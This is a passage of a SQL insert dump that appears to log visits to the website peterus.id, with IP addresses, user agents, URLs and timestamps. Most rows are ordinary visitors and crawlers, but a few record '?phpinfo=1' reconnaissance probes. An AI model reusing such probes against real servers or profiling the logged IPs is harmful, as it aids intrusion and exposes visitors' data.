(980, '194.233.72.214', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'https://www.peterus.id', '2025-07-01 01:17:26', '2025-07-01 01:17:26'),
(981, '194.233.72.214', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'https://www.peterus.id/?phpinfo=1', '2025-07-01 01:17:49', '2025-07-01 01:17:49'),
(982, '207.46.13.54', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-07-01 16:08:35', '2025-07-01 16:08:35'),
(983, '172.232.232.10', 'Mozilla/5.0 (Linux; Android 10; SM-G950U; Build/QQ1B.210907.29) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-01 21:26:17', '2025-07-01 21:26:17'),
(984, '172.232.232.10', NULL, 'https://peterus.id', '2025-07-01 21:26:37', '2025-07-01 21:26:37'),
(985, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-02 03:07:54', '2025-07-02 03:07:54'),
(986, '16.78.197.107', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27', 'https://peterus.id', '2025-07-02 05:07:16', '2025-07-02 05:07:16'),
(987, '138.197.110.237', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-07-02 06:35:08', '2025-07-02 06:35:08'),
(988, '40.77.167.70', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-07-02 16:13:02', '2025-07-02 16:13:02'),
(989, '94.159.110.103', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36', 'https://peterus.id', '2025-07-02 17:44:36', '2025-07-02 17:44:36'),
(990, '203.55.131.3', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-02 20:58:42', '2025-07-02 20:58:42'),
(991, '20.171.207.194', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://peterus.id', '2025-07-03 01:45:41', '2025-07-03 01:45:41'),
(992, '121.5.231.252', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-03 04:44:26', '2025-07-03 04:44:26'),
(993, '121.5.231.252', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-03 04:44:26', '2025-07-03 04:44:26'),
(994, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-03 04:58:27', '2025-07-03 04:58:27'),
(995, '185.177.72.16', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://peterus.id/index.php', '2025-07-03 05:28:35', '2025-07-03 05:28:35'),
(996, '185.177.72.16', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id/index.php', '2025-07-03 05:28:35', '2025-07-03 05:28:35'),
(997, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-03 07:44:08', '2025-07-03 07:44:08'),
(998, '206.189.224.4', 'Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0', 'https://peterus.id', '2025-07-03 09:19:52', '2025-07-03 09:19:52'),
(999, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-03 09:32:21', '2025-07-03 09:32:21'),
(1000, '139.162.119.94', NULL, 'https://peterus.id', '2025-07-03 12:36:23', '2025-07-03 12:36:23'),
(1001, '52.167.144.186', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-07-03 16:28:09', '2025-07-03 16:28:09'),
(1002, '149.57.180.41', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-07-03 18:44:58', '2025-07-03 18:44:58'),
(1003, '149.57.180.35', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-07-03 19:14:58', '2025-07-03 19:14:58'),
(1004, '23.27.145.26', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-07-03 19:45:03', '2025-07-03 19:45:03'),
(1005, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-03 21:15:43', '2025-07-03 21:15:43'),
(1006, '162.142.125.204', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'https://peterus.id', '2025-07-04 11:52:58', '2025-07-04 11:52:58'),
(1007, '162.142.125.204', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'https://peterus.id', '2025-07-04 11:53:50', '2025-07-04 11:53:50'),
(1008, '114.79.3.194', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-04 13:51:16', '2025-07-04 13:51:16'),
(1009, '20.171.207.80', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://www.peterus.id', '2025-07-04 19:23:32', '2025-07-04 19:23:32'),
(1010, '124.223.197.100', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-04 22:23:44', '2025-07-04 22:23:44'),
(1011, '124.223.197.100', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-04 22:23:44', '2025-07-04 22:23:44'),
(1012, '138.246.253.7', 'quic-go-HTTP/3', 'https://peterus.id', '2025-07-04 22:53:53', '2025-07-04 22:53:53'),
(1013, '139.162.3.144', 'Mozilla/5.0 (X11; Linux x86_64; rv:108.0.1) Gecko/20100101 Firefox/108.0.1', 'https://peterus.id', '2025-07-05 00:04:07', '2025-07-05 00:04:07'),
(1014, '139.162.3.144', NULL, 'https://peterus.id', '2025-07-05 00:04:27', '2025-07-05 00:04:27'),
(1015, '143.198.172.214', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-05 00:46:58', '2025-07-05 00:46:58'),
(1016, '138.246.253.7', 'quic-go-HTTP/3', 'https://www.peterus.id', '2025-07-05 03:11:45', '2025-07-05 03:11:45'),
(1017, '114.79.2.57', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-05 03:15:16', '2025-07-05 03:15:16'),
(1018, '185.177.72.144', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://peterus.id', '2025-07-05 07:17:12', '2025-07-05 07:17:12'),
(1019, '185.177.72.144', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id', '2025-07-05 07:17:16', '2025-07-05 07:17:16'),
(1020, '185.177.72.144', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://peterus.id/?phpinfo=1', '2025-07-05 07:17:43', '2025-07-05 07:17:43'),
(1021, '185.177.72.144', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id/?phpinfo=1', '2025-07-05 07:18:19', '2025-07-05 07:18:19'),
(1022, '114.79.5.22', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-05 07:19:38', '2025-07-05 07:19:38'),
(1023, '34.91.100.6', 'Scrapy/2.12.0 (+https://scrapy.org)', 'https://www.peterus.id', '2025-07-05 21:03:12', '2025-07-05 21:03:12'),
(1024, '206.168.34.71', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'https://peterus.id', '2025-07-06 02:05:06', '2025-07-06 02:05:06'),
(1025, '54.184.220.74', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-06 03:53:21', '2025-07-06 03:53:21'),
(1026, '172.232.232.179', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15.3; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://peterus.id', '2025-07-06 09:33:00', '2025-07-06 09:33:00'),
(1027, '172.232.232.179', NULL, 'https://peterus.id', '2025-07-06 09:33:21', '2025-07-06 09:33:21'),
(1028, '152.53.178.51', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-06 11:06:36', '2025-07-06 11:06:36'),
(1029, '149.57.180.143', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-07-06 17:57:08', '2025-07-06 17:57:08'),
(1030, '111.7.106.106', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', 'https://www.peterus.id', '2025-07-06 19:35:04', '2025-07-06 19:35:04'),
(1031, '111.7.106.106', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36', 'https://www.peterus.id', '2025-07-06 19:35:05', '2025-07-06 19:35:05'),
(1032, '3.17.255.71', 'Mozilla/5.0 zgrab/0.x', 'https://peterus.id', '2025-07-06 21:36:55', '2025-07-06 21:36:55'),
(1033, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-07 00:53:51', '2025-07-07 00:53:51'),
(1034, '71.6.134.230', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-07-07 01:29:48', '2025-07-07 01:29:48'),
(1035, '198.235.24.14', NULL, 'https://peterus.id', '2025-07-07 02:17:59', '2025-07-07 02:17:59'),
(1036, '167.94.138.169', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'https://peterus.id', '2025-07-07 03:21:27', '2025-07-07 03:21:27'),
(1037, '71.6.134.233', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-07-07 04:31:01', '2025-07-07 04:31:01'),
(1038, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-07 06:14:09', '2025-07-07 06:14:09'),
(1039, '212.102.51.242', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-07 09:29:57', '2025-07-07 09:29:57'),
(1040, '212.102.51.242', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-07 09:49:55', '2025-07-07 09:49:55'),
(1041, '167.172.63.184', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id', '2025-07-07 15:58:58', '2025-07-07 15:58:58'),
(1042, '167.172.63.184', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363', 'https://peterus.id', '2025-07-07 15:58:58', '2025-07-07 15:58:58'),
(1043, '54.229.226.192', 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)', 'https://www.peterus.id', '2025-07-07 17:16:50', '2025-07-07 17:16:50'),
(1044, '205.210.31.139', NULL, 'https://www.peterus.id', '2025-07-07 19:03:13', '2025-07-07 19:03:13'),
(1045, '172.232.232.169', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-07 21:14:18', '2025-07-07 21:14:18'),
(1046, '172.232.232.169', NULL, 'https://peterus.id', '2025-07-07 21:14:38', '2025-07-07 21:14:38'),
(1047, '3.249.22.40', 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)', 'https://peterus.id', '2025-07-07 22:26:54', '2025-07-07 22:26:54'),
(1048, '77.81.142.78', 'WanScannerBot/1.1', 'https://peterus.id', '2025-07-08 00:36:10', '2025-07-08 00:36:10'),
(1049, '77.81.142.78', 'WanScannerBot/1.1', 'https://www.peterus.id', '2025-07-08 00:36:12', '2025-07-08 00:36:12'),
(1050, '216.39.248.54', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-08 00:57:04', '2025-07-08 00:57:04'),
(1051, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-08 01:27:35', '2025-07-08 01:27:35'),
(1052, '5.133.192.128', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-08 07:09:10', '2025-07-08 07:09:10'),
(1053, '194.164.107.5', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-08 14:28:44', '2025-07-08 14:28:44'),
(1054, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-09 03:32:17', '2025-07-09 03:32:17'),
(1055, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-09 03:32:18', '2025-07-09 03:32:18'),
(1056, '106.54.200.247', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-09 05:20:42', '2025-07-09 05:20:42'),
(1057, '106.54.200.247', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-09 05:20:44', '2025-07-09 05:20:44'),
(1058, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-09 06:02:28', '2025-07-09 06:02:28'),
(1059, '159.65.253.31', 'Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0', 'https://peterus.id', '2025-07-09 06:56:30', '2025-07-09 06:56:30'),
(1060, '159.65.253.31', 'Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0', 'https://peterus.id', '2025-07-09 06:56:30', '2025-07-09 06:56:30'),
(1061, '159.65.253.31', 'Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0', 'https://peterus.id', '2025-07-09 06:56:31', '2025-07-09 06:56:31'),
(1062, '172.241.142.64', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-07-09 08:09:12', '2025-07-09 08:09:12'),
(1063, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-09 08:23:00', '2025-07-09 08:23:00'),
(1064, '139.162.3.144', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15 like Mac OS X) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-09 13:02:37', '2025-07-09 13:02:37'),
(1065, '139.162.3.144', NULL, 'https://peterus.id', '2025-07-09 13:02:57', '2025-07-09 13:02:57'),
(1066, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-10 01:41:13', '2025-07-10 01:41:13'),
(1067, '20.171.207.88', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://www.peterus.id', '2025-07-10 01:58:12', '2025-07-10 01:58:12'),
(1068, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-10 05:08:45', '2025-07-10 05:08:45'),
(1069, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-10 05:43:20', '2025-07-10 05:43:20'),
(1070, '202.155.132.73', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-10 13:09:18', '2025-07-10 13:09:18'),
(1071, '139.162.119.94', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-10 23:12:46', '2025-07-10 23:12:46'),
(1072, '139.162.119.94', NULL, 'https://peterus.id', '2025-07-10 23:13:07', '2025-07-10 23:13:07'),
(1073, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-10 23:50:51', '2025-07-10 23:50:51'),
(1074, '138.199.6.230', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-11 02:32:19', '2025-07-11 02:32:19'),
(1075, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-11 02:47:03', '2025-07-11 02:47:03'),
(1076, '124.222.196.113', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-11 04:22:37', '2025-07-11 04:22:37'),
(1077, '124.222.196.113', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-11 04:22:39', '2025-07-11 04:22:39'),
(1078, '49.113.95.182', 'Go-http-client/1.1', 'https://peterus.id', '2025-07-11 04:26:11', '2025-07-11 04:26:11'),
(1079, '23.27.145.87', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-07-11 04:48:53', '2025-07-11 04:48:53'),
(1080, '138.246.253.7', 'quic-go-HTTP/3', 'https://peterus.id', '2025-07-11 05:54:28', '2025-07-11 05:54:28'),
(1081, '138.246.253.7', 'quic-go-HTTP/3', 'https://www.peterus.id', '2025-07-11 09:21:15', '2025-07-11 09:21:15'),
(1082, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-11 09:27:31', '2025-07-11 09:27:31'),
(1083, '13.67.116.60', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-11 12:00:46', '2025-07-11 12:00:46'),
(1084, '157.55.39.204', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-07-11 14:10:14', '2025-07-11 14:10:14'),
(1085, '20.171.207.59', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://peterus.id', '2025-07-11 15:44:39', '2025-07-11 15:44:39'),
(1086, '13.67.116.60', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0', 'https://peterus.id', '2025-07-11 19:51:12', '2025-07-11 19:51:12'),
(1087, '13.67.116.60', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/128.0 Safari/537.36', 'https://peterus.id', '2025-07-11 19:51:12', '2025-07-11 19:51:12'),
(1088, '13.67.116.60', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-07-11 19:51:12', '2025-07-11 19:51:12'),
(1089, '13.67.116.60', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15', 'https://peterus.id', '2025-07-11 19:51:12', '2025-07-11 19:51:12'),
(1090, '13.67.116.60', 'Mozilla/5.0 (Knoppix; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0', 'https://peterus.id', '2025-07-11 19:51:14', '2025-07-11 19:51:14'),
(1091, '103.23.136.34', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-11 23:11:12', '2025-07-11 23:11:12'),
(1092, '114.79.6.89', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-12 06:05:53', '2025-07-12 06:05:53'),
(1093, '114.79.6.89', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-12 06:06:09', '2025-07-12 06:06:09'),
(1094, '114.79.6.89', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id', '2025-07-12 06:08:24', '2025-07-12 06:08:24'),
(1095, '114.79.0.105', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-07-12 06:29:46', '2025-07-12 06:29:46'),
(1096, '114.79.6.89', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id', '2025-07-12 06:53:11', '2025-07-12 06:53:11'),
(1097, '205.210.31.31', NULL, 'https://peterus.id', '2025-07-12 10:53:38', '2025-07-12 10:53:38'),
(1098, '172.236.137.159', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-12 19:03:34', '2025-07-12 19:03:34'),
(1099, '172.236.137.159', NULL, 'https://peterus.id', '2025-07-12 19:03:54', '2025-07-12 19:03:54'),
(1100, '205.210.31.170', NULL, 'https://www.peterus.id', '2025-07-12 19:48:41', '2025-07-12 19:48:41'),
(1101, '157.55.39.54', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-07-12 22:58:33', '2025-07-12 22:58:33'),
(1102, '101.35.239.216', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-13 03:08:53', '2025-07-13 03:08:53'),
(1103, '101.35.239.216', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-13 03:08:53', '2025-07-13 03:08:53'),
(1104, '185.247.137.4', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', 'https://www.peterus.id', '2025-07-13 03:31:43', '2025-07-13 03:31:43'),
(1105, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-13 13:07:36', '2025-07-13 13:07:36'),
(1106, '23.106.193.238', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-13 21:45:42', '2025-07-13 21:45:42'),
(1107, '139.162.3.144', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-14 00:47:08', '2025-07-14 00:47:08'),
